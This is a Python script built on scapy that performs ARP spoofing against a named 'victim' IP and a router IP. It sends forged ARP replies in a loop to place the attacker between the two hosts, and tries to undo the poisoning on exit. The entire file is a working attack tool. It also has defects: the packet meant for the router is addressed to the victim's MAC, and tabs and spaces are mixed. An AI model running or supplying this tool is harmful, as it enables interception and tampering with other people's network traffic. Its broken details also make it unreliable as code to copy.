#!/usr/bin/env python
 
import scapy.all as scapy
import time
import sys
import optparse
import sys
#-------------------------Main Code-------------------------------->
def get_args():
    parser = optparse.OptionParser()
 
    parser.add_option("-v", dest = "victim", help="Victim IP")
    parser.add_option("-s", dest = "spoof", help="Spoof IP (eg. router)")
    (options,args) = parser.parse_args()
    if not options.victim:
        parser.error("[!] Please specify victim IP address")
    elif not options.spoof:
        parser.error("[!] Please specify spoof IP address (eg. router IP)")
 
    return options
 
def get_mac(ip):
	
    print("[+] Getting MAC...")
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast/arp_req
    answered = scapy.srp(packet, timeout=1, verbose=False)[0]
    if answered:
        print("[+] MAC is " + answered[0][1].hwsrc )
        return answered[0][1].hwsrc
    else:
        print("[!] Unable to get MAC address!")
	sys.exit()

	
 
def spoof(victimIP,spoofIP):
        vMac = get_mac(victimIP)
        if vMac:
            packet_to_victim = scapy.ARP(op=2, pdst=victimIP, hwdst=vMac, psrc=spoofIP)
            packet_spoof = scapy.ARP(op=2, pdst=spoofIP, hwdst=vMac, psrc=victimIP)
            try:
                count = 0
                while True:
                    scapy.send(packet_to_victim, verbose=False)
                    scapy.send(packet_spoof, verbose=False)
                    count = count + 2
                    print("\r[+] Sent " + str(count) + " packets.."),
                    sys.stdout.flush()
                    time.sleep(2)
            except KeyboardInterrupt:
                restore(victimIP,spoofIP)
                print("\n[!] Quitting..")
 
 
def restore(destIP,sourceIP):
    destMAC = get_mac(destIP)
    sourceMAC = get_mac(sourceIP)
    if destMAC and sourceMAC:
        print("\n[+] Restoring ARP tables to original...")
        packet = scapy.ARP(op=2, pdst=destIP, hwdst=destMAC, psrc=sourceIP, hwsrc=sourceMAC)
        scapy.send(packet, verbose=False)
    else: print("[!] Restoration failed!")
 
#--------------------------END of Main Code------------------------------->
 
options=get_args()
spoof(options.victim,options.spoof)